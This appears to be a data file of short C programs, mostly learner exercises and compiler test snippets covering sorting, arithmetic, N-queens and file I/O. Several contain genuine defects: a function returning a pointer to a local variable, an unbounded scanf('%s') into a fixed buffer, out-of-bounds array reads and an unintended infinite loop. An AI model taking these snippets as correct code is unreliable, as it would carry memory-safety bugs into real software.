    "#include <stdio.h>\nint* functA( int elem )\n{\n    int i = elem;\n    printf(\"i: %d, &i:%p\\n\",i, &i );\n    i++;\n    printf(\"i: %d, &i:%p\\n\",i, &i );\n    return &i;\n}\nint main(void)\n{\n    int k = 100;\n    int *p = ((void*)0);\n    p = functA( k );\n    printf(\"k: %d, p: %p\\n\", k, p );\n    printf(\"*p: %d \\n\", *p );\n return 0;\n}",
    "#include <stdio.h>\nvoid test(int** p)\n{\n}\nint main()\n{\n  int arr[] = {30, 450, 14, 5};\n  test(&arr);\n  return 0;\n}",
    "#include <stdio.h>\nint sum(int a) {\n    auto int c = 0;\n    static int b = 5;\n    c++;\n    b++;\n    printf(\"c=%d\\t,b=%d\\t\", c, b);\n    return (a + b + c);\n}\nint main(void) {\n    int i;\n    int a = 2;\n    for (i = 0; i < 5; i++) {\n        printf(\"time %d sum(a)=%d\\n\", i, sum(a));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <pthread.h>\nvoid *echo(void *arg)\n{\n    (void) arg;\n    printf(\"self => %p\\n\", (void *) pthread_self());\n    return ((void*)0);\n}\nint main()\n{\n    close(open(\"/tmp/zipjail-input\", (0x04000000)));\n    pthread_t t1, t2;\n    pthread_create(&t1, ((void*)0), &echo, ((void*)0));\n    pthread_create(&t2, ((void*)0), &echo, ((void*)0));\n    pthread_join(t1, ((void*)0));\n    pthread_join(t2, ((void*)0));\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n if(printf(\"Hello World\\n\")<0)\n  abort();\n}",
    "#include <errno.h>\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\nint main( void )\n{\n close(5);\n printf(\"%s\\n\", strerror(errno));\n return 0;\n}",
    "#include<stdio.h>\n#include<math.h>\nint main (){\n double r,h,pi=3.1418,v;\n printf(\"Informe o valor do volume do cilindro\\n\");\n scanf(\"%lf\",&v);\n printf(\"Informe o valor do raio\\n\");\n scanf(\"%lf\",&r);\n h=v/(pi*pow(r,2));\n printf(\"Altura tem o valor de %.2lf\",h);\n return 0;\n}",
    "static int calc_rpn(const char *src)\n{\n    int stack[10];\n    int sp = -1;\n    for (int i = 0; src[i] != '\\0'; i++) {\n        if ('0' <= src[i] && src[i] <= '9') {\n            stack[++sp] = src[i] - '0';\n            continue;\n        }\n        switch (src[i]) {\n        case '+':\n            stack[sp - 1] = stack[sp - 1] + stack[sp];\n            sp--;\n            break;\n        case '-':\n            stack[sp - 1] = stack[sp - 1] - stack[sp];\n            sp--;\n            break;\n        case '*':\n            stack[sp - 1] = stack[sp - 1] * stack[sp];\n            sp--;\n            break;\n        }\n    }\n    return stack[sp];\n}\nint main()\n{\n    return calc_rpn(\"3 4 + 2 1 - *\");\n}",
    "#include <stdio.h>\nint main()\n{\n    double n1, n2, n3;\n    printf(\"Enter three numbers: \");\n    scanf(\"%lf %lf %lf\", &n1, &n2, &n3);\n    if (n1 >= n2 && n1 >= n3)\n        printf(\"%.2lf is the largest number.\", n1);\n    else if (n2 >= n1 && n2 >= n3)\n        printf(\"%.2lf is the largest number.\", n2);\n    else\n        printf(\"%.2lf is the largest number.\", n3);\n    return 0;\n}",
    "#include <inttypes.h>\n#include <stdio.h>\nint main(int argc, char** argv)\n{\n    int32_t result = 0;\n    if (argc > 1)\n    {\n        for (int i = 1; i < argc; ++i)\n        {\n            if (i == argc - 1 &&\n                sscanf(argv[i], \"%\" \"d\" \"\", &result) == 1)\n            {\n            }\n            else\n            {\n                (void)printf(\"%s\\n\", argv[i]);\n            }\n        }\n    }\n    return (int)result;\n}",
    "#include <inttypes.h>\nint64_t foo (int64_t i) {\n  return __atomic_add_fetch(&i, 1, 5);\n}\nint main() {\n}",
    "#include <stdio.h>\nint main() {\n  int a = -11;\n  float f = 11.0;\n  printf(\"%d\\n\", a);\n  a = -a;\n  printf(\"%d\\n\", a);\n  printf(\"%f\\n\", f);\n  f = -f;\n  printf(\"%f\\n\", f);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(int* from, int* to) {\n    int aux = *to;\n    *to = *from;\n    *from = aux;\n}\nvoid ordenar(int A[], int n){\n    int pos_ord = 0;\n    do {\n        int menor = A[pos_ord], pos = pos_ord;\n        int i;\n        for(i = pos_ord; i < n; i++) {\n            if(A[i] < menor) {\n                menor = A[i];\n                pos = i;\n            }\n        }\n        int swap;\n        swap = A[pos_ord];\n        A[pos_ord++] = menor;\n        A[pos] = swap;\n    }while(pos_ord != n);\n    int i;\n    for(i = 0; i < n; i++)\n        printf(\"%d \", A[i]);\n    printf(\"\\n\");\n}\nint main() {\n    int arr[] = {5, 4, 3, 2, 1};\n    ordenar(arr, 5);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint main() {\n  char string[200];\n  char *c = fgets(string, 200, (stdin));\n  for (; *c; ++c) if (strchr(c + 1, *c)) break;\n  puts(*c ? \"Deja Vu\" : \"Unique\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\nint number = 1;\nint number2 = 31;\n     do {\n    printf(\"%d\\n\",number);\n    number++;\n}\nwhile( number = number2);\nreturn 0;\n}",
    "#include<stdio.h>\n#include <stdlib.h>\nint compare (const void * a, const void * b)\n{\n return ( *(int*)b - *(int*)a );\n}\nint main()\n{\n int n,i,j=0,temp=0,x,num=1;\n scanf(\"%d\",&n);\n int in[n];\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&in[i]);\n }\n scanf(\"%d\",&x);\n qsort(in,n,sizeof(int),compare);\n for(i=0;i<n;i++)\n {\n  if(in[i]!=in[i+1])\n   j++;\n  if(j==x-1)\n   break;\n }\n i++;\n while(1)\n {\n  if(in[i]==in[i+1])\n  {\n   num++;\n   i++;\n  }\n  else\n   break;\n }\n printf(\"%d %d\",in[i],num);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int a, b, soma;\n    puts(\"Entre o primeiro numero:\");\n    scanf(\"%d\", &a);\n    puts(\"Entre o segundo numero:\");\n    scanf(\"%d\", &b);\n    soma = a + b;\n    printf(\"Resultado da soma: %d + %d = %d\\n\", a, b, soma);\n    return 0;\n}",
    "#include <stdio.h>\nlong long a = 10;\nlong long b = 255;\nlong long c = 37;\nint main() {\n  b = (a = c);\n  printf(\"%lld\\n\", a);\n  printf(\"%lld\\n\", b);\n  printf(\"%lld\\n\", c);\n  return 0;\n}",
    "#include<stdio.h>\nint main ()\n{\nint i =5, sum =0;\nfor(i=5;i*(i+1)<400;i++)\n{\nsum=sum+i;\n}\nprintf(\"%d\",sum);\n}",
    "#include <stdio.h>\nint main() {\n    int codeOfProduct, unitOfProduct;\n    double amountOfPerProduct, totalAmountOfProduct = 0;\n    for(int i = 1; i <= 2; i++){\n        scanf(\"%d %d %lf\",&codeOfProduct, &unitOfProduct, &amountOfPerProduct);\n        totalAmountOfProduct += unitOfProduct * amountOfPerProduct;\n    }\n    printf(\"VALOR A PAGAR: R$ %.2lf\\n\",totalAmountOfProduct);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int i, j, k;\n scanf(\"%6d\",&i);\n scanf(\"%2o\",&j);\n scanf(\"%2x\",&k);\n printf(\" %d , %o , %x \",i,j,k);\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\nint main()\n{\n    char *args[] = {\"echo\", \"hello\", \"world\", \"from\", \"execvp!\", ((void*)0)};\n    execvp(\"echo\", args);\n    return 0;\n}",
    "#include <stdlib.h>\nint main() {\n  int *val = calloc(1, sizeof(int));\n  free(val);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nint index_of_shortest(int* lines, int num_lines);\nint main () {\n    int n = 0, m = 0;\n    int lines[100];\n    scanf(\"%d %d\", &n, &m);\n    for(int i = 0; i < n; i++) {\n        scanf(\"%d\", lines + i);\n    }\n    for(int i = 0; i < m; i++) {\n        int ind = 0, len = 0;\n        ind = index_of_shortest(lines, n);\n        len = lines[ind];\n        printf(\"%d\\n\", len);\n        lines[ind]++;\n    }\n    return 0;\n}\nint index_of_shortest(int* lines, int num_lines){\n    int index = 0, shortest = 200;\n    for(int i = 0; i < num_lines; i++){\n        if(lines[i] < shortest){\n            shortest = lines[i];\n            index = i;\n        }\n    }\n    return index;\n}",
    "#include <stdio.h>\n#include <string.h>\n\nint Freq_Check(char[],char[]);\nint main(){\nchar str[100]=\"abracadabra\",substr[100]=\"abrac\";\nint ans=Freq_Check(str,substr);\nprintf(\"%d\",ans);\nreturn 0;}\nint Freq_Check(char str[],char substr[]){\nint l1=strlen(str),l2=strlen(substr);\nif(l2>l1)\n{\n    return 0;\n}\nif(l1==l2){\n    if(strcmp(str,substr)==0){\n        return 1;\n    }\n    else{\n        return 0;\n    }\n}\nint freq=0;\nfor(int i=0;i<=l1-l2;i++)\n{\n    if(str[i]==substr[0])\n    { int flag=1;\n        for(int k=0;k<l2;k++){\n            if(str[i+k]!=substr[k]){\n                flag=0;\n                break;\n            }\n        }\n        if(flag==1){\n            freq++;\n            i=i+l2-1;\n        }\n    }\n}\nreturn freq;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint check(int mark[], int cur, int n)\n{\n    int i;\n    for ( i = n; i > cur; i-- )\n    {\n        if ( mark[i] == mark[cur] )\n            return 0;\n        if ( mark[i]+i == mark[cur]+cur )\n            return 0;\n        if ( mark[i]-i == mark[cur]-cur )\n            return 0;\n    }\n    return 1;\n}\nvoid calQueens(int mark[], int cur, int n, int *count)\n{\n    if ( cur == 0 )\n        *count += 1;\n    else\n    {\n        int i;\n        for ( i = 1; i <= n; i++ )\n        {\n            mark[cur] = i;\n            if ( check(mark, cur, n) )\n                calQueens(mark, cur-1, n, count);\n        }\n    }\n    return;\n}\nint totalNQueens(int n)\n{\n    if ( n == 0 )\n        return 0;\n    int count = 0;\n    int *mark = (int *)malloc(sizeof(int)*(n+1));\n    calQueens(mark, n, n, &count);\n    free(mark);\n    return count;\n}\nint main()\n{\n    printf(\"%d\\n\", totalNQueens(14));\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  int num;\n  for (;;) {\n    scanf(\"%d\", &num);\n    if (num <= 0) {\n      break;\n    }\n    for (int i = 0; i < num; i++) {\n      printf(\"%d\\n\", i);\n    }\n  }\n  printf(\"All done!\\n\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\n\nint main(void)\n{\n unsigned int i, n, raffles = 10, ticket[((9u) - (1u) + 1u)];\n\n\n\n\n\n srand(time(((void*)0)));\n\n while (raffles--)\n {\n  for (n = 0; n < ((9u) - (1u) + 1u); ++n)\n   ticket[n] = (1u) + n;\n  while (n)\n  {\n   i = rand() / (((0x7fffffff) + 1u) / n--);\n   printf(\"%u\", ticket[i]);\n   ticket[i] = ticket[n];\n  }\n  printf(\"\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nvoid swap(int* a, int* b) {\n  int temp = *a;\n  *a = *b;\n  *b = temp;\n}\nvoid insertion_sort(int arr[], int n) {\n  int i, j;\n  for(i = 1 ; i < n ; i++) {\n    j=i;\n    while ((j>0) && (arr[j] < arr[j-1])) {\n      swap(&arr[j], &arr[j-1]);\n      j--;\n    }\n  }\n}\nstatic int myCompare (const void * a, const void * b) {\n  return strcmp (*(const char **) a, *(const char **) b);\n}\nvoid string_sort(const char *arr[], int n) {\n  qsort (arr, n, sizeof (const char *), myCompare);\n}\nint main() {\n  int arrint[10] = {12, 76, 3, 1, 33, 88, 92, 2, 7, 4};\n  insertion_sort(arrint, 10);\n  for(int i = 0 ; i < 10 ; i++)\n    printf(\"%d \", arrint[i]);\n  puts(\"\");\n  const char *strarr[] = {\"bbb\", \"ccc\", \"aaa\"};\n  int n = sizeof(strarr)/sizeof(strarr[0]);\n  string_sort(strarr, n);\n  for (int i = 0; i < n; i++)\n    printf(\"%s \", strarr[i]);\n  puts(\"\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  char s[80] = \"main()\\n{\\n}\\n\";\n  printf(\"%s\", s);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nunsigned char convert(unsigned char c) {\n return (c & 0x40) << 1\n      | (c & 0x07) << 4\n      | (c & 0x80) >> 4\n      | (c & 0x38) >> 3;\n}\nvoid execute(unsigned char *tape, size_t datapointer) {\n unsigned char insn, arg;\n size_t instructionpointer = 0;\n while (++instructionpointer) {\n  insn = tape[instructionpointer] & 0xf0;\n  arg = tape[instructionpointer] & 0x0f;\n  switch (insn) {\n   case 0x00: exit(arg); break;\n   case 0x10: *tape += tape[datapointer + arg]; break;\n   case 0x20: *tape -= tape[datapointer + arg]; break;\n   case 0x30: tape[datapointer + arg] = *tape; break;\n   case 0x40: *tape = tape[datapointer] + arg; break;\n   case 0x50: datapointer += 1 << arg; break;\n   case 0x60: datapointer -= 1 << arg; break;\n   case 0x70: instructionpointer += arg + 1; break;\n   case 0x80: instructionpointer -= arg + 2; break;\n   case 0x90: if (!*tape) instructionpointer += arg + 1; break;\n   case 0xa0: if (!*tape) instructionpointer -= arg + 2; break;\n   case 0xb0: if (*tape) instructionpointer += arg + 1; break;\n   case 0xc0: if (*tape) instructionpointer -= arg + 2; break;\n   case 0xd0: tape[datapointer + arg] = getchar(); break;\n   case 0xe0: putchar(tape[datapointer + arg]); break;\n   case 0xf0: tape[datapointer + arg] = rand() % 0xff; break;\n  }\n }\n}\nint main(int argc, char **argv) {\n int c;\n FILE *src;\n size_t cap = 1, len = 1;\n unsigned char *tape = calloc(1, 1);\n if (argc != 2) {\n  return fprintf((stderr), \"The Rune programming-language Copyright 2021 Timo Sarkar\\n\\nUsage: %s < foo.rune >\\n\\n\", *argv);\n }\n if (!(src = fopen(argv[1], \"r\"))) {\n  return fprintf((stderr), \"Unable to open file '%s'\\n\", argv[1]);\n }\n while ((c = fgetc(src)) != (-1)) {\n  if (c == 0xe2) {\n   c = convert((fgetc(src) - 0xa0) * 0x40 + (fgetc(src) - 0x80));\n   if (cap == len) {\n    tape = realloc(tape, cap <<= 1);\n   }\n   tape[len++] = c;\n  }\n }\n srand((unsigned int) &c);\n execute(tape, len);\n fclose(src);\n free(tape);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int x1, x2, v1, v2, flag = 1;\n scanf(\"%d%d%d%d\", &x1, &v1, &x2, &v2);\n if((x1 < x2) && (v1 < v2))\n {\n  printf(\"NO\");\n  flag = 0;\n }\n while(flag)\n {\n  if(x1 == x2)\n  {\n   printf(\"YES\");\n   break;\n  }\n  else if(x1 > x2)\n  {\n   printf(\"NO\");\n   break;\n  }\n  if(x1 < x2)\n  {\n   x1 += v1;\n   x2 += v2;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char **argv) {\n int r = 0;\n for(int i = 1; i < argc; i++) {\n  for(int b = 0; b < 3; b++) r += argv[i][b] - 48;\n  printf(\"%i \", r);\n  r = 0;\n }\n printf(\"\\n\");\n for(int i = 1; i < argc; i++) {\n  for(int b = 0; b < 3; b++) r += argv[i][b] - 48;\n  printf(\"%c\", r+0x61);\n  r = 0;\n }\n printf(\"\\n\");\n}",
    "#include<stdio.h>\n#include<string.h>\n#include<stdlib.h>\nint testChar(char a);\nint main(int argc, char** argv)\n{\n    char a = argv[1][0];\n    testChar(a);\n    return 1;\n}\nint testChar(char a)\n{\n    int b = 0;\n    if(a == 'a') {\n        b = 1;\n    }\n    return b;\n}",
    "#include <stdio.h>\nvoid read_into_array(int arr[], int size){\n    for (int i = 0; i < size; i++){\n        scanf(\"%d\", &arr[i]);\n    }\n}\nvoid check_subarray(int a[], int b[], int s1, int s2){\n    int cnt = 0;\n    for (int i = 0; i < s1; i++){\n        if (a[i] == b[0]) {\n            cnt = i;\n            break;\n        }\n    }\n    for (int i = 0; i < s2; i++){\n        if (b[i] != a[i+cnt]) {\n            printf(\"NO\");\n            return;\n        }\n    }\n    printf(\"YES\");\n}\nint main() {\n int n1, n2;\n scanf(\"%d\", &n1);\n int A1[n1];\n read_into_array(A1, n1);\n scanf(\"%d\", &n2);\n int A2[n2];\n read_into_array(A2, n2);\n    check_subarray(A1, A2, n1, n2);\n return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n printf(\"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n int score;\n printf(\"Enter score: \");\n scanf(\"%d\",&score);\n printf(\"Output of first if statement: \");\n if(score >= 90)\n  printf(\"A\");\n else if (score >=80)\n  printf(\"B\");\n else if(score >=70)\n  printf(\"C\");\n else if(score>60)\n  printf(\"D\");\n else\n  printf(\"F\");\n printf(\"\\nOutput of second if statement: \");\n if(score < 60)\n  printf(\"F\");\n else if(score <70)\n  printf(\"D\");\n else if(score<80)\n  printf(\"C\");\n else if(score<90)\n  printf(\"B\");\n else\n  printf(\"A\");\n printf(\"\\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\\n\");\n return 0;\n}",
    "int x;\nint main(void) {\n return __builtin_expect(x, 0);\n}",
    "#include <stdio.h>\nint main()\n{\n    int N, M, X;\n    printf(\"Quantas figurinhas o \u00e1lbum pode conter?\\n\");\n    scanf(\"%d\", &N);\n    printf(\"Quantas figurinhas voc\u00ea j\u00e1 comprou?\\n\");\n    scanf(\"%d\", &M);\n    if( M < 1 && M > 300 ){\n        if(M < 0){\n            printf(\"Est\u00e1 devendo figurinhas?\");\n        }else if(M > 300){\n            printf(\"Stop it! Get some help!\");\n        } else {\n            printf(\"Voc\u00ea tem %d figurinhas.\\n\", M);\n        }\n    }\n    if(N >= 1 && N <= 100){\n        printf(\"Seu \u00e1lbum tem %d espa\u00e7os.\\n\", N);\n    } else {\n        if(N < 0){\n            printf(\"Saporra \u00e9 invis\u00edvel, \u00e9?\");\n        }else if(N > 100){\n            printf(\"\u00c9 um album... n\u00e3o um vade mecum.\");\n        }\n    }\n        X = N - M;\n    if (X < 0 || X > N){\n        printf(\"Assim voc\u00ea me complica, n\u00e9 patr\u00e3o!\");\n    } else {\n        printf(\"Faltam %d figurinhas para completar o \u00e1lbum.\\n\", X);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid print_char_arr(char a[], int n) {\n    int i;\n    for(i=0; i<n; i++)\n        printf(\"%c \", a[i]);\n    printf(\"\\n\");\n}\nvoid print_int_arr(int a[], int n) {\n    int i;\n    for(i=0; i<n; i++)\n        printf(\"%d \", a[i]);\n    printf(\"\\n\");\n}\nint main(){\n    char c_arr[20];\n    char val1 = 65;\n    printf(\"Memset with char on char array\\n\");\n    memset(c_arr, val1, 10);\n    print_char_arr(c_arr, 20);\n    int val2 = 2886;\n    printf(\"Memset with int on char array\\n\");\n    memset(c_arr, val2, 20);\n    print_char_arr(c_arr, 20);\n    int int_arr[10];\n    printf(\"Memset with char on int array\\n\");\n    memset(int_arr, val2, 10);\n    print_int_arr(int_arr, 20);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int a,b,c,n=0;\n scanf(\"%d\",&c);\n for(;c>0;c--)\n {\n  for(b=1;b<c;b++)\n  {\n   for(a=1;a<b;a++)\n   {\n    if(a*a+b*b==c*c)\n    {\n     n++;\n    }\n   }\n  }\n }\n printf(\"%d\\n\",n);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nvoid gerarMatriz(int tamanhoMatriz, int matriz[tamanhoMatriz][tamanhoMatriz]){\n int linha, coluna;\n  for (linha = 0; linha < tamanhoMatriz; linha++) {\n    for (coluna = 0; coluna < tamanhoMatriz; coluna++) {\n      matriz[linha][coluna] = 0;\n    }\n  }\n}\nvoid preencherDiagonalPrincipal(int tamanhoMatriz,\nint matriz[tamanhoMatriz][tamanhoMatriz]){\n int linha, coluna;\n  for (linha = 0; linha < tamanhoMatriz; linha++) {\n    for (coluna = 0; coluna <= linha + 1; coluna++) {\n      if(linha == coluna){\n        matriz[linha][coluna] = 1;\n    }\n    }\n  }\n}\nvoid imprimirMatriz(int tamanhoMatriz, int matriz[tamanhoMatriz][tamanhoMatriz]){\n int linha, coluna, valorAleatorio;\n  for (linha = 0; linha < tamanhoMatriz; linha++) {\n    for (coluna = 0; coluna < tamanhoMatriz; coluna++) {\n      printf(\"%d | \", matriz[linha][coluna]);\n    }\n    printf(\"\\n\");\n  }\n  printf(\"\\n\");\n}\nint main() {\n  int tamanhoMatriz = 6, matriz[tamanhoMatriz][tamanhoMatriz];\n  srand(time(((void*)0)));\n gerarMatriz(tamanhoMatriz, matriz);\n printf(\"Imprimindo matriz inicial: \\n\\n\");\n imprimirMatriz(tamanhoMatriz, matriz);\n printf(\"Imprimindo matriz preechida diagonal principal com 1: \\n\\n\");\n preencherDiagonalPrincipal(tamanhoMatriz, matriz);\n imprimirMatriz(tamanhoMatriz, matriz);\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a=0,b=0,mul=1;\n    printf(\"Give range: \");\n    scanf(\"%d %d\",&a,&b);\n    while(a<=b)\n    {\n        if(a%2!=0)mul *= a;\n        a++;\n    }\n    printf(\"The product of all odd numbers within the given range = %d\",mul);\n    return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\nint main(int argc, char **argv)\n{\n    const char *name;\n    FILE *input, *output;\n    unsigned int length = 0;\n    unsigned char data;\n    if (argc < 3 || argc > 4)\n        return 1;\n    input = fopen(argv[1], \"rb\");\n    if (!input)\n        return -1;\n    output = fopen(argv[2], \"wb\");\n    if (!output)\n        return -1;\n    if (argc == 4) {\n        name = argv[3];\n    } else {\n        size_t arglen = strlen(argv[1]);\n        name = argv[1];\n        for (int i = 0; i < arglen; i++) {\n            if (argv[1][i] == '.')\n                argv[1][i] = '_';\n            else if (argv[1][i] == '/')\n                name = &argv[1][i+1];\n        }\n    }\n    fprintf(output, \"const unsigned char ff_%s_data[] = { \", name);\n    while (fread(&data, 1, 1, input) > 0) {\n        fprintf(output, \"0x%02x, \", data);\n        length++;\n    }\n    fprintf(output, \"0x00 };\\n\");\n    fprintf(output, \"const unsigned int ff_%s_len = %u;\\n\", name, length);\n    fclose(output);\n    if (ferror(input) || !feof(input))\n        return -1;\n    fclose(input);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid swap(int*, int*);\nint main(void)\n{\n    int n, a, b;\n    int i;\n    int* heapArray = ((void*)0);\n    scanf(\"%d\", &n);\n    getchar();\n    heapArray = (int*)malloc(sizeof(int) * n);\n    if (heapArray == ((void*)0)) exit(1);\n    for (i = 0; i < n; i++)\n        scanf(\"%d\", heapArray + i);\n    getchar();\n    scanf(\"%d %d\", &a, &b);\n    swap(heapArray + a, heapArray + b);\n    for (i = 0; i < n; i++)\n        printf(\" %d\", *(heapArray + i));\n    putchar('\\n');\n    free(heapArray);\n    return 0;\n}\nvoid swap(int* t1, int* t2)\n{\n    int temp;\n    temp = *t1;\n    *t1 = *t2;\n    *t2 = temp;\n}",
    "#include <stdio.h>\nint main()\n{\n    char caracter = 0;\n    printf(\"Digite um caractere: \");\n    scanf(\"%c\", &caracter);\n    if ((caracter >= 'a' && caracter <= 'z') || (caracter >= 'A' && caracter <= 'Z'))\n    {\n        printf(\"O caracter e uma letra!\");\n    }\n    else\n    {\n        printf(\"O caracter nao e uma letra!\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\n\nunsigned num = 0;\nunsigned board[8];\nFILE *file;\nvoid place(unsigned);\nvoid printSolution();\nunsigned isPlace(unsigned);\nsigned main() {\n    place(0);\n    printf(\"8 queens problem solved....\\n\");\n    printf(\"to see the solution, check the file puzzle.txt.\");\n    return 0;\n}\nvoid place(unsigned row) {\n    if (row == 8)\n        printSolution();\n    else\n        for (board[row] = 1; board[row] < (1 << 8); board[row] <<= 1)\n            if (isPlace(row))\n                place(row + 1);\n}\nunsigned isPlace(unsigned row) {\n    unsigned r;\n    for (r = 0; r < row; r++)\n        if ((board[row] == board[r]) ||\n            (board[row] == (board[r] << (row - r))) ||\n            (board[row] == (board[r] >> (row - r))))\n            return 0;\n    return 1;\n}\nvoid printSolution() {\n    unsigned t, r;\n    file = fopen(\"puzzle.txt\", \"a\");\n    if (file) {\n        fprintf(file, \"\\n\\n\\tSOLUTION %u\\n\\n\", ++num);\n        for (r = 0; r < 8; r++) {\n            for (t = (1 << (8 - 1)); t > 0; t >>= 1)\n                fprintf(file, \" %c\", board[r] == t ? 'V' : '.');\n            fprintf(file, \"\\n\");\n        }\n    } else\n        perror(\"the file could not be opened!\");\n}",
    "int countArray(int A[], int numElements, int cntType);\nint Pass(int x);\nint Fail(int x);\nint main() {\n    int size = 2;\n    int PassCnt, FailCnt;\n    int testArray[2] = { 55, 83 };\n    PassCnt = countArray(testArray, size, 1);\n    FailCnt = countArray(testArray, size, -1);\n}\nint countArray(int A[], int numElements, int cntType) {\n    int i, cnt = 0;\n    for(i=numElements-1; i>-1; i--) {\n        switch (cntType) {\n            case 1: cnt += Pass(A[i]); break;\n            default: cnt += Fail(A[i]);\n        }\n    }\n    return cnt;\n}\nint Pass(int x) {\n    if(x>=60) return 1;\n    else return 0;\n}\nint Fail(int x) {\n    if (x<60) return 1;\n    else return 0;\n}",
    "#include<stdio.h>\n\n\n\nchar composite[3000000];\nint main() {\n  int i, j, k, count;\n  count = 1;\n  for (i = 3; i <= 3000000/i; i += 2) {\n    if (composite[i]) continue;\n    count++;\n#pragma omp parallel for\n    for (j = 3; j < 3000000; j += 2)\n      if (i*1ll*j < 3000000)\n        composite[i*j] = 1;\n  }\n  for (; i < 3000000; i += 2)\n    count += !composite[i];\n  printf(\"%d\\n\", count);\n  return 0;\n}",
    "#include <stdio.h>\n#include <time.h>\n\nvoid selection_sort(int a[], int size);\nvoid print(int arr[]);\nvoid selection_sort(int a[], int size) {\n int i = 0;\n int j = 0;\n int large = 0;\n int index = 0;\n for(i = size - 1; i > 0; i--) {\n  large = a[0];\n  index = 0;\n  for(j = 1; j <= i; j++)\n   if(a[j] > large) {\n    large = a[j];\n    index = j;\n   }\n   a[index] = a[i];\n   a[i] = large;\n }\n}\nvoid print(int arr[])\n{\n  int i;\n  for(i = 0; i < 10; ++i)\n  {\n    printf(\"%d \", arr[i]);\n  }\n  printf(\"\\n\");\n}\nint main()\n{\n  int array[10] = {29,25,-1,49,9,37,21,43};\n  printf(\"Initial array\\n\");\n  print(array);\n  printf(\"------------\\n\");\n  clock_t start = clock();\n  selection_sort(array, 10);\n  clock_t end = clock();\n  double time_spent = (double)(end - start) / ((clock_t)1000000000);\n  printf(\"Sorted array\\n\");\n  print(array);\n  printf(\"Time spent sorting: %f\\n\", time_spent);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid writeValues(int quant, char* filePath);\nvoid readValues(int quant, char* filePath);\nint main(){\n  FILE *p;\n  int quant;\n  char filePath [100];\n  printf(\"Insert the name of the file -> \");\n  scanf(\"%s\", filePath);\n  printf(\"Insert how many values you will save on the file -> \");\n  scanf(\"%d\",&quant);\n  writeValues(quant, filePath);\n  readValues(quant, filePath);\n  return 0;\n}\nvoid writeValues(int quant, char* filePath){\n FILE *f = fopen(filePath, \"wb\");\n if(f != ((void*)0)){\n   float value;\n   for(int i = 0; i < quant; i++){\n     printf(\"Insert a value: \");\n     scanf(\" %f\", &value);\n     fwrite(&value, sizeof(float), 1, f);\n   }\n   fclose(f);\n }\n else{\n    printf(\"Unable to open the file\\n\");\n    exit(1);\n }\n}\nvoid readValues(int quant, char* filePath){\n FILE *f = fopen(filePath, \"r\");\n if(f != ((void*)0)){\n   float value;\n   for(int i = 0; i < quant; i++){\n     fread(&value, sizeof(float), 1, f);\n     printf(\"Value %i -> %f \\n\",i, value);\n   }\n   fclose(f);\n }\n else{\n    printf(\"Unable to open the file\\n\");\n    exit(1);\n }\n}",
    "int main(void)\n{\n  return 3?45:86;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint NUM = 923243;\nint* repeater(int);\nint main() {\n    int *f;\n    f = repeater(NUM);\n    for (int i = 0; i < 10; i++)\n        if (f[i] > 1)\n            printf(\"%d \", i);\n    printf(\"\\n\");\n}\nint *repeater(int n) {\n    int *f = calloc(sizeof(int), 10);\n    while (n) {\n        f[n % 10]++;\n        n /= 10;\n    }\n    return f;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n if (argc != 2) {\n  printf(\"ERROR: You need one argument.\\n\");\n  return 1;\n }\n int i = 0;\n for (i = 0; argv[1][i] != '\\0'; i++) {\n  char letter = argv[1][i];\n  switch (letter) {\n   case 'a':\n   case 'A':\n    printf(\"%d: 'A'\\n\", i);\n    break;\n   case 'e':\n   case 'E':\n    printf(\"%d: 'E'\\n\", i);\n    break;\n   case 'i':\n   case 'I':\n    printf(\"%d: 'I'\\n\", i);\n    break;\n   case 'o':\n   case 'O':\n    printf(\"%d: 'O'\\n\", i);\n    break;\n   case 'u':\n   case 'U':\n    printf(\"%d: 'U'\\n\", i);\n    break;\n   case 'y':\n   case 'Y':\n    if (i > 2) {\n     printf(\"%d: 'Y'\\n\", i);\n    }\n    break;\n   default:\n    printf(\"%d: %c is not a vowel\\n\", i, letter);\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int sum = 0, prod = 1, i = 1;\n    while (i <= 9) {\n        sum += i;\n        prod *= i;\n        i += 2;\n    }\n    printf(\"\\nSum = %d\\nProduct = %d\", sum, prod);\n}",
